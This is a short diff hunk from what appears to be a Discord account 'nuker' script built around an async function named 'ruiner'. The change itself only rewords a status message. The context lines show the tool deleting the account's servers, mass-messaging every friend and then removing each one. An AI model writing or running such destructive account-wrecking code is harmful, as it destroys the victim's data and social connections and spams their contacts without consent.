@@ -82,7 +82,7 @@ async def ruiner():
             except:
                 await gid.delete()
                 print(f"i deleted {guild}")
-    print("[+] Sending message, removing friends, and closing their DM.")
+    print("[+] Sending message and removing friends...")
     for friend in c.user.friends:
         await friend.send(message)
         await friend.remove_friend()
